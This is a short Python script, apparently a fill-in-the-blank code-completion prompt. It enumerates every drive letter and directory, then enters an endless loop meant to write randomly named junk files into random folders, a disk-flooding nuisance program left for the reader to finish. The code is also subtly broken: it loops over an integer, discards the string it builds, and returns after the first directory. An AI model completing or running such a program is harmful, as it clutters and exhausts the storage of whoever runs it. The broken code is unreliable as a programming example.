import subprocess
import os
import random

characters_list = [
	"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f","g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"
]

path_list = [
	"A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"
]

def rand_file_name():
	dir_name_length = random.randint(2, 15)
	file_name = ""
	for i in dir_name_length:
		file_name + random.choice(characters_list)
	return file_name

def search_all_dirs():
	all_dirs = []
	for i in path_list:
		try:
			drive_path = i
			for root, dirs, files in os.walk(drive_path):
				for dir in dirs:
					dir_path = os.path.join(root,dir)
					all_dirs.append(dir_path)
					return all_dirs
		except FileNotFoundError:
			pass

all_directories = search_all_dirs()

# Create a randomly named text file in a randomly selected directory and write the randomly generated text content to the file.
while True:
	<FILL_HERE>